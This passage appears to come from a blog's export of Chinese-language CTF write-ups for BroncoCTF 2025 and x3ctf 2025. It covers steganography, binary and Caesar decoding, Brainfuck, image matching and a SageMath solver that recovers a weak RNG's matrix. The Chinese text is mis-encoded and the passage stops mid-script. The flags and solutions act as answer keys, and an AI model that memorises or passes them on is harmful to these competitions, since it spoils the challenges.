i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinteresting ç„¶åç”¨pythonå†™ä¸€æ®µé€†å‘çš„è„šæœ¬å³å¯å¾—åˆ°flag ï¼ˆä¸»è¦å†…å®¹å…¶å®å°±æ˜¯å¤åˆ¶ç²˜è´´ï¼‰ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105def what_do_i_do(whoKnows): a_st = &#123;&#125; for a in whoKnows: if a_st.get(a) is None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] return (not_a_variable_name, variable_name)def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinterestingdef i(): return &#x27;free_flag_f&#x27;def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_3(): return &#x27;m&#x27;def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;# æ‹¼æ¥ flagflag = ( char_0() + char_1_4_6() + char_2_5_9() + char_3() + char_1_4_6() + char_2_5_9() + char_1_4_6() + char_7() + char_8() + char_2_5_9() + char_10())print(&quot;Recovered flag:&quot;, flag)# i_am_a_flag# bronco&#123;i_am_a_flag&#125; ForensicsQR Coded è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€å¼ äºŒç»´ç ï¼š ç›´æ¥æ‰«æï¼ˆhttps://scanqr.org/ï¼‰ä¼šå¾—åˆ°ä¸€ä¸ªfake flagï¼š ç”¨Stegsolveæ‰“å¼€å¹¶è°ƒæ•´åˆ°Gray bitsä¼šå¾—åˆ°å¦å¤–ä¸€å¼ äºŒç»´ç ï¼š æ‰«æåä¼šå¾—åˆ°çœŸæ­£çš„flagï¼š 1bronco&#123;th1s_0n3_i5&#125; Uno è¿™é“é¢˜æˆ‘ä»¬ä¼šå¾—åˆ°è¿™æ ·ä¸€å¼ å›¾ç‰‡ï¼š æ ¹æ®é¢˜ç›®æè¿°ï¼ˆâ€a significant bit of the cards were left on the plane I was on.â€œï¼‰æˆ‘ä»¬çŒœæµ‹è¿™é“é¢˜ç”¨çš„æ˜¯LSBéšå†™äº†ASCIIç ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨StegSolveæ‰“å¼€å›¾ç‰‡ï¼Œåˆ©ç”¨å…¶Data Extractæ¨¡å—è¿›è¡ŒæŸ¥çœ‹ã€‚è¿™ä¸ªæ¨¡å—å¯ä»¥æŸ¥çœ‹RGBä¸‰ç§é¢œè‰²çš„æ¯ä¸€ä¸ªé€šé“ï¼Œå¹¶ä¸”æŒ‰ç…§ï¼ˆè‡ªé€‰çš„ï¼‰ä¸€å®šçš„æ’åˆ—é¡ºåºæ˜¾ç¤ºæ¯ä¸ªé€šé“çš„Hexå’ŒASCIIç å­—ç¬¦ï¼š æœ€åï¼Œæ ¹æ®é¢˜ç›®æè¿°ä¸­çš„ â€œthe numbers really speak to meâ€¦â€ è¿™ä¸€å¥ï¼Œå°è¯•å„ç§ç”± 2ã€3ã€4ã€5 ç»„æˆçš„ç»„åˆï¼Œä¾¿å¯ä»¥å¾—åˆ° flagï¼š 1bronco&#123;no_un0_y3t&#125; Wordlands æˆ‘ä»¬ä¼šå¾—åˆ°è¿™å¼ å›¾ç‰‡ï¼š ç»è¿‡ä¸€ç•ªå°è¯•åï¼Œå½“ç”¨StegSolveæ‰“å¼€å›¾ç‰‡ï¼Œåˆ©ç”¨å…¶Data Extractæ¨¡å—è¿›è¡ŒæŸ¥çœ‹æ—¶å¯ä»¥å‘ç°ï¼š 8BPSæ˜¯æ ‡å‡†çš„Photoshop çš„.psd æ–‡ä»¶æœ‰å›ºå®šçš„æ–‡ä»¶å¤´ï¼Œæ‰€ä»¥æˆ‘ä»¬ç‚¹å‡»â€œSave Binâ€å°†å…¶å­˜ä¸ºwordlands.psdï¼Œå¹¶ç”¨è¿™ä¸ªç½‘ç«™æ‰“å¼€å®ƒï¼š https://www.photopea.com/ å¯ä»¥å‘ç°è¿™é‡Œæœ‰æ‰€æœ‰å›¾ç‰‡åˆ›ä½œçš„ä¿¡æ¯ï¼ˆå›¾å±‚ä¹‹ç±»çš„ï¼‰ã€‚æœ€åæ ¹æ®lineçš„å›¾å±‚çš„é¡ºåºè¿›è¡Œæ‹¼æ¥ä¾¿å¯ä»¥å¾—åˆ°flagï¼š æ¯”å¦‚è¯´Shape1è¿™ä¸ªå›¾å±‚é‡Œçš„çº¿è¿æ¥äº†bå’Œrï¼Œè¡¨ç¤ºå¼€å¤´ä¸ºbr ç„¶åæ˜¯(b)roï¼Œä»¥æ­¤ç±»æ¨â€¦ 1bronco&#123;i_love_admiring_beautiful_winter_landscapes&#125; MiscTick Tock è¿™é“é¢˜æˆ‘ä»¬é¦–å…ˆä¼šå¾—åˆ°è¿™å¼ å›¾ç‰‡ï¼š ç»è¿‡å¤šæ¬¡å°è¯•å¯ä»¥åœ¨StegSolveçš„Data Extractæ¨¡å—é‡Œå‘ç°æœ‰ä¸€é•¿ä¸²ç”±â€œtickâ€å’Œâ€œtockâ€ç»„æˆçš„å†…å®¹ï¼š 1ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock å†™ä¸€æ®µpythonå°†tickæ›¿æ¢æˆ0ï¼Œtockæ›¿æ¢æˆ1ç„¶åå½“æˆäºŒè¿›åˆ¶å†…å®¹è¿›è¡Œè§£ç ä¼šå¾—åˆ°ï¼š 1234567891011121314151617def ticktock_to_binary(text): return text.replace(&quot;tick&quot;, &quot;0&quot;).replace(&quot;tock&quot;, &quot;1&quot;)text = &quot;ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock&quot;text = text.replace(&quot; &quot;, &quot;&quot;)binary = ticktock_to_binary(text)print(binary)# 01110001 01100111 01100100 01100011 01110010 01100100 01111011 01110101 01111000 01101011 01110100 01011111 01100010 01111000 01100011 01101010 01101001 01110100 01101000 01011111 01101010 01100011 01101001 01111000 01100001 01011111 01100010 01111000 01110011 01100011 01111000 01110110 01110111 01101001 01111101content = &#x27;&#x27;.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))print(content)# qgdcrd&#123;uxkt_bxcjith_jcixa_bxscxvwi&#125; æœ€åé€šè¿‡éå†å‡¯æ’’å¯†ç ä¾¿å¯ä»¥å¾—åˆ°flagï¼š 1bronco&#123;five_minutes_until_midnight&#125; æ¯”èµ›å®˜æ–¹GitHubhttps://github.com/SCUBroncoSec/BroncoCTF-2025-Public","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]},{"title":"X3ctf2025 Write Up","slug":"CTF/Writeup/X3ctf2025-Write-Up","date":"2025-03-10T12:25:08.000Z","updated":"2025-03-29T19:01:01.170Z","comments":true,"path":"2025/03/10/CTF/Writeup/X3ctf2025-Write-Up/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/Writeup/X3ctf2025-Write-Up/","excerpt":"x3ctfæ¯”èµ›çš„é¢˜è§£ï¼Œæ¶‰åŠæ–¹å‘ï¼šMisc, Crypto","text":"Miscp11n-trophyï¼ˆç­¾åˆ°é¢˜ï¼‰:é¢˜ç›®æè¿°ï¼š æˆ‘ä»¬é¦–å…ˆä¼šå¾—åˆ°è¿™æ ·ä¸€ä»½è¯ä¹¦ï¼š ç¬¬ä¸€é¢˜ç­¾åˆ°é¢˜çš„ç­”æ¡ˆå°±æ˜¯è¯ä¹¦ä¸‹é¢æ­£ä¸­é—´çš„â€œThis certificate does not grant the rank of Masterâ€ã€‚ trophy-plus + trophy-plus64:è¿™ä¸¤é“ç›®æè¿°ä¸€æ¨¡ä¸€æ · å…¶ä¸­ä¸€ä¸ªflagæ˜¯è—åœ¨certificateå‘¨å›´ä¸€åœˆçš„ä½ç½®ï¼š äººå·¥å°†è¿™äº›å†…å®¹è¯†åˆ«ï¼Œå†ç¿»è¯‘æˆäºŒè¿›åˆ¶ç„¶åè§£ç å°±ä¼šå¾—åˆ°flag 1234567891011121314151617181920212223242526272829303132def decode_binary(content, mapping): # Convert content to binary using the mapping binary_str = &#x27;&#x27;.join(mapping[char] for char in content if char in mapping) # Split the binary string into 8-bit chunks bytes_list = [binary_str[i:i+8] for i in range(0, len(binary_str), 8)] # Convert each 8-bit chunk to a character decoded_text = &#x27;&#x27;.join(chr(int(byte, 2)) for byte in bytes_list if len(byte) == 8) return decoded_text# Input stringc_1 = &quot;MVVVVMMMMMVVMMVVMVVMMMVVMVVVVMVVMVVM VMMV MV MVVVVVMVVMM VMM MMVVMMMV&quot;c_2 = &quot;MVVMM VMMMVVMVVVMMM VMMVVVMVVVMV MMM VMVVVVVMVVM VMVVMVVMVVVMMMVVMMMMMVVVMVVVM VMVVVVV&quot;c_3 = &quot;VMMMVVMMM VMMMVVMVVVVVM VMMV MMVVVMMMMMVVMMMVVMMVVMVVVVVM VMMM VMMVVMVVMMVVMMVVMMVVVM VMV MVVVMVVVVVM VM VM VMMVVMMV MMMVVMVVVVVMV MMMV MMVVMMMVVMVVM VMV MVVVMMMMMVVMMVVMMMVVMVVVVVM VMV MVVMVVMMVVMVVVM VMVVMVVM&quot;reversed_c_3 = c_3[::-1]c_4 = &quot;MMV MMVVMMMMMVVMMVVMMMVVMMVVVMVVMVVMMVVMMVVVVVM VMV MMVVVVMMV MMVVVMMM VMVVMMMVVVMVVM&quot;reversed_c_4 = c_4[::-1]c_5 = &quot;MMVVMMM VMVVMVVVMMVVMMVVVM VMVVVVVMVVMVVMMMMVVMMMMMVVMVVMMMVVVVVMV&quot;# mapping = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;mapping1 = &#123;&#x27;M&#x27;: &#x27;1&#x27;, &#x27;V&#x27;: &#x27;0&#x27;&#125;mapping2 = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;# print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(c_3, mapping2) + decode_binary(c_4, mapping2) + decode_binary(c_5, mapping2) )print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(reversed_c_3, mapping2) + decode_binary(reversed_c_4, mapping2) + decode_binary(c_5, mapping2) )# è¾“å‡ºç»“æœï¼šx3c&#123;i_d1dn&#x27;t_kn0w_mvm_c0uld_be_us3d_f0r_b1n4ry_3nc0d1ng_l0l&#125; å¦å¤–ä¸€ä¸ªflagåˆ™æ˜¯è—åœ¨å³ä¸‹è§’çš„å‹‹ç« é‡Œï¼š äººå·¥å°†è¿™äº›å†…å®¹è¯†åˆ«å‡ºæ¥ç„¶åç”¨base64è¿›è¡Œè§£ç å³å¯ã€‚ å†…å®¹å¤§æ¦‚ä¸ºï¼š 12345678910111213141516171819202122232425262728-----BEGIN CERTIFICATE-----MIIDyjCCAlCgAwIBAgISBKmF/S4TYSXpTzcor9eZJ/GrMAoGCCqGSM49BAMDMDIxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEwlMZXQncyBFbmNyeXB0MQswOQYDVQQDEwJFNjAeFw0yNTAxMDYyMDM2MDFaFw0yNTA0MDYyMDM2MDBaMEAxPjA8BgNVBAMMNXgzY3ttdTV0X2IzX2Zlbl90eXAxbmdfdGgxcl9ieV9oNG5kXzEzNzUxMDUzMDQyNDgzNjF9MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEcYu3flnEI2dttI5lQQmzRld72SDdBqCDtfto9pg5t/NFFIolkY8W8CryM9XlJEx3NAOGTgBoeUNTuWgiCseQeaOCAjYwggIyMA4GA1UdDwEB/wQEAwIHgDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwDAYDVR0TAQH/BAIwADAdBgNVRQ4EFgQUrbtyF28hjw8oIqwXpakw8t7J9jQwHwYDVR0jBBgwFoAUkydGmAOpUWiOmNbEQkjbI79YlNIwVQYIKwYBBQUHAQEESTBHMCEGCCsGAQUFBzABhhVodHRwOi8vZTYuby5sZW5jci5vcmcwIgYIKwYBBQUHMAKGFmh0dHA6Ly91Ni5pLmxlbmNyLm9yZy8wQAYDVR0RBDkwN4IleDNje2llNXRfYjNfZnVuX3R5cDFuZl90aDFzX2J5X2g0bmRfMTM3NTEwNTMwNDI0ODM2MX0wEwYDVR0gBAwwCjAIBgZngQwBAgEwggEDBgorBgEEAdZ5AgQCBIH0BIHxAO8AdQB9WR4S4XggexxhZ3xe/fjQhlw0oE6VnrkDL9kOjC55uAAAAZQ9inTEAAAEAwBGMEQCIENpWRg98SQo5JdzyjgnyFeUY0WnNVzn5NkdDA3bzeKbAiBsAkk3fe5esm7A0efsLN/EyFjEK/NBGqYxgOucgZheQwB2ABNK3xglmEIjeAxv70x6kaQWtyNJzlhXat+u2qfCq+AiAAAB1D2KdXoAAAQDAEcwRQIgBfU4pkiNyNsl+I6skjXz6qqu+mNoI4JvtDsoYxoI+ZoCIQCRiMQSCEwahN0ImXu3cwDeyM+AbNeve0VgSLMSUBdxvTAKBggghkjOPQQDAwNoADBlAjEAvxa6nSpUMl7NuDB/+LJfzTskR498vLoetnZuHo14J6d9zuFRGQ8Dk4w2aQNsbuVsAjB9fE6GJYBiebb4aHu/J2amych3KP//D951/CdmiV5PKZqXWWdpaQZL+pbmsXRa8rM=-----END CERTIFICATE----- ä¼šæœ‰ä¸€äº›è¯¯å·®ï¼Œæ‰€ä»¥æœ€åæäº¤flagæ—¶éœ€è¦å¤šè¯•å‡ æ¬¡ã€‚ foundations ï¼ˆOsintï¼‰ï¼šé¢˜ç›®æè¿°ï¼š ä½¿ç”¨https://archive.org/æ¥æœç´¢è¿™ä¸ªæ¯”èµ›ç½‘ç«™çš„å†å²çºªå½•å†…å®¹ å¯ä»¥åœ¨è¿™é‡Œå‘ç°æœ€æ—©çš„çºªå½•æ˜¯åœ¨2024å¹´7æœˆ14æ—¥ï¼š ç‚¹è¿›å»ä¼šå‘ç°ï¼š x3CTF{m4yb3_w3ll_m4ke_4_ch4ll3nge_0u7_0f_7h1s} mvmï¼š æ‰“å¼€ä¸‹è½½æ–‡ä»¶ä¼šå¾—åˆ° 12MMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVVVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVM è·Ÿä¹‹å‰ä¸€æ ·ï¼Œå°†å…¶è½¬æˆäºŒè¿›åˆ¶å†è§£ç ä¼šå¾—åˆ° 1++[----------&gt;+&lt;]&gt;.+++++++++.---------.-[-&gt;+++++&lt;]&gt;-.+[-----&gt;+&lt;]&gt;+.+++++++++.---------.-[----&gt;+++++&lt;]&gt;.+[---&gt;++&lt;]&gt;++.&gt;-[---&gt;+&lt;]&gt;---.--[-&gt;++++&lt;]&gt;+.++++++++.+++++.[--&gt;+++++++++&lt;]&gt;.[---&gt;+++++&lt;]&gt;.++++++++++.++++++++++++.-[-----&gt;+&lt;]&gt;.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.------.-.++[-&gt;+++++&lt;]&gt;+.[-----&gt;++++&lt;]&gt;+.+++++++++.---------.&gt;--[--&gt;+++&lt;]&gt;. å¾ˆæ˜¾ç„¶è¿™æ˜¯Brainfuck,æ‰€ä»¥æ‰¾ä¸ªåœ¨çº¿çš„intepreterè¿è¡Œä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flagï¼š MVM{MVM_BRAIN_IS_FUCKED_MVM} count-the-mvmsä¸»è¦æ˜¯æ•°èƒŒæ™¯çš„mvmä¸ªæ•°ï¼Œå‘ç°å®ƒä»¬çš„åƒç´ ç‚¹æ˜¯ä¸€æ ·çš„ã€‚æ‰€ä»¥å†™ä¸ªå›¾åƒåŒ¹é…è„šæœ¬å³å¯. é¦–å…ˆè¦æŠŠpdfè½¬æ¢æˆ pngï¼Œæ¨è adobe acrobat 123456789101112131415161718192021222324252627282930313233343536import cvlib# cvlib æ˜¯è‡ªå·±å†™çš„åº“im = cvlib.read_img(&quot;certificate_h4tum.png&quot;)sim = cvlib.subrectimg(im, 605, 516, 837, 665)sim2 = cvlib.subrectimg(sim, 44, 32, 79, 48)mvm = cvlib.subrectimg(sim2, 2, 2, 32, 13)print(&quot;read success&quot;)def match(im, x,y): if x+len(mvm) &gt; len(im): return False if y+len(mvm[0]) &gt; len(im[0]): return False for i in range(len(mvm)): for j in range(len(mvm[i])): [r,g,b] = mvm[i][j] [ri,gi,bi] = im[x+i][y+j] if r != ri or g != gi or b != bi: return False return True def count_matches(im): cnt = 0 for i in range(len(im)): print(i) for j in range(len(im[i])): if match(im, i,j): cnt += 1 j += len(mvm[0]) - 1 return cntprint(count_matches(im))print(&quot;finish&quot;) Cryptoman-vs-matrix:é¢˜ç›®æè¿°ï¼š æ‰“å¼€ä¸‹è½½æ–‡ä»¶ä¼šçœ‹åˆ°ï¼š 1234567891011121314151617181920212223242526272829303132from sage.all import *from Crypto.Util.number import bytes_to_longclass RNG: def __init__(self, seed): self.p = next_prime(2**24) # 16777259 self.F = GF(self.p) self.M = matrix(self.F, 3,3, [bytes_to_long(seed[i:i+3]) for i in range(0, len(seed), 3)]) self.state = vector(self.F, map(ord, &quot;Mvm&quot;)) # [77, 118, 109] self.gen = self.F(2) def get_random_num(self): out = self.M * self.state for i in range(len(self.state)): # len = 3 self.state[i] = self.gen**self.state[i] return out * self.stateflag = b&quot;MVM&#123;???????????????????????????&#125;&quot;seed = flag[4:-1] # 27ä½ï¼Œ27/3=9rng = RNG(seed)samples = []for i in range(9): samples.append(rng.get_random_num())print(f&quot;&#123;samples = &#125;&quot;)# samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781] æ˜¯å‡ ä¸ªéšæœºæ•°çš„ç”Ÿæˆå™¨ï¼ˆRNGï¼‰ï¼Œä½†ç”Ÿæˆé€»è¾‘éå¸¸ç®€å•ã€‚ æ¯æ¬¡ä¼šè®¡ç®— (\\text{M} \\cdot \\text{state}) \\cdot \\text{new\\_state}(æ‹¬å·å¤–çš„ä¹˜æ³•æ˜¯å†…ç§¯ã€‚åœ¨sageé‡Œï¼ŒçŸ©é˜µä¸çŸ©é˜µ/å‘é‡çš„ä¹˜æ³•å’Œå‘é‡ä¸å‘é‡çš„å†…ç§¯éƒ½æ˜¯ç”¨*)ã€‚å¹¶ä¸”æœ‰ \\text{new\\_state}[i] = 2^{\\text{state}[i]}.è¿™é‡Œçš„åˆå§‹stateæ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å»ºç«‹ä¸€ä¸ª9å…ƒ1æ¬¡çº¿æ€§æ–¹ç¨‹ç»„å³å¯ã€‚ æˆ‘ä»¬å¯ä»¥å†™ä¸€æ®µsagemathçš„ä»£ç æ¥é€šè¿‡è§£æ–¹ç¨‹é€†æ¨å‡ºmatrixä»¥åŠflagå†…å®¹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162p = 16777259 # = next_prime(2**24)F = GF(p)samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781]# åˆå§‹çŠ¶æ€ S0 = [77, 118, 109]S0 = vector(F, [77, 118, 109])def next_state(st): return vector(F, [F(2)^int(x) for x in st])# æ±‚å‡º S0 ~ S9S = [None]*10S[0] = S0for i in range(1, 10): S[i] = next_state(S[i-1])# æ„é€ çº¿æ€§æ–¹ç¨‹ç»„ X * M_vec = YX = matrix(F, 9, 9)Y = vector(F, 9)for i in range(9): row_coeffs = [] # M_vec çš„é¡ºåº: M[0,0], M[0,1], M[0,2], M[1,0], ..., M[2,2] for k in range(3): for j in range(3): row_coeffs.append(S[i][j] * S[i+1][k]) X[i] = row_coeffs Y[i] = samples[i]# æ±‚è§£ 9 ä¸ªæœªçŸ¥é‡M_vec = X.solve_right(Y)M_mat = matrix(F, 3, 3, M_vec)print(&quot;Recovered M =&quot;)print(M_mat)# å°† 3x3 çŸ©é˜µä»¥è¡Œä¼˜å…ˆé¡ºåºï¼ˆrow-majorï¼‰å±•å¼€æˆ 9 ä¸ªå…ƒç´ # å¯¹åº”å½“åˆ [bytes_to_long(seed[0:3]), bytes_to_long(seed[3:6]), ..., bytes_to_long(seed[24:27])]m_ints = []for i in range(3): for j in range(3): # Sage è¿”å›çš„æ˜¯ GF(p) çš„å…ƒç´ ï¼Œå…ˆè½¬æˆæ™®é€šæ•´å‹ val = int(M_mat[i, j]) m_ints.append(val)# å°†æ¯ä¸ª val è½¬æˆ 3 å­—èŠ‚åä¾æ¬¡æ‹¼æ¥seed_recovered = 